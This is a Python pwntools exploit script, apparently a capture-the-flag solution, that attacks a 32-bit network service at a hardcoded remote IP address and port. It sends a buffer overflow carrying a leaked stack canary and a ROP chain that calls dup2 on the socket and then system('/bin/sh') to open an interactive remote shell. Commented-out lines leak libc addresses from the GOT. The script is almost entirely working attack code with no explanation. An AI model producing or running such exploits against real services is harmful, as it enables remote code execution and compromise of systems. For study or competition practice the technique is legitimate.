from pwn import *
from time import sleep

send_str = 0x80488B1
print_goodbye = 0x8048C23
got_atoi = 0x804B050
pop_pop_ret = 0x08048b84

## local
# canary = '\x00\xfa\xe4$'
# libc_base = 0xf7533000
# system = 0xf756e020
# dup2 = 0xf760b8f0
# bin_sh = 0xf769260f

# remote
canary = '\x00"\x8d3'
libc_base = 0xf756f000
system = 0xf75af190
bin_sh = 0xf76cfa24
dup2 = 0xf764a590

r = remote('110.10.212.130', 8888)
# r = remote('127.0.0.1', 8181)

print r.recvuntil('> ')
r.sendline('1')
print r.recvuntil(': ')
r.send(flat('A'*40, canary, 'A'*12,   # padding
            dup2, pop_pop_ret, 4, 0,  # dup2(4, 0)
            dup2, pop_pop_ret, 4, 1,  # dup2(4, 1)
            system, 0, bin_sh))       # system("/bin/sh")

print repr(r.recvuntil('> '))
r.sendline('3')

r.interactive()

## leak the address of libc
# r.send(flat('A'*40, canary, 'A'*12, send_str, print_goodbye, got_atoi))
# print repr(r.recvuntil('> '))
# r.sendline('3')
# data = r.recvall()
# print repr(data)
# print 'atoi: ' + hex(u32(data[:4]))
# print 'socket: ' + hex(u32(data[4:8]))
# print 'sigaction: ' + hex(u32(data[8:12]))
